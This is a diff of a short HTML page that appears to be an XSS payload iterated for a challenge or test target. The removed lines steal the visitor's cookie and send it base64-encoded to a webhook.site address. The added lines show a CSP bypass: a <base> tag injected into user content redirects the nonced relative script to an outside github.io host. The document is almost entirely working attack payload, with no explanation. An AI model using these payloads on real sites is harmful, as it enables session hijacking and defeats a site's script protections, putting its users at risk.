@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head> </head>
+  <head>
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'none'; script-src 'nonce-abc123';"
+    />
+  </head>
   <body>
-    <script>
-      var cookie = document.cookie;
-      fetch(
-        "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
-          window.btoa(cookie)
-      );
-    </script>
+    <div id="userContent">
+      <base href="https://celik1001.github.io/wbs/" />
+    </div>
+    <script nonce="abc123" src="app.js"></script>
   </body>
 </html>
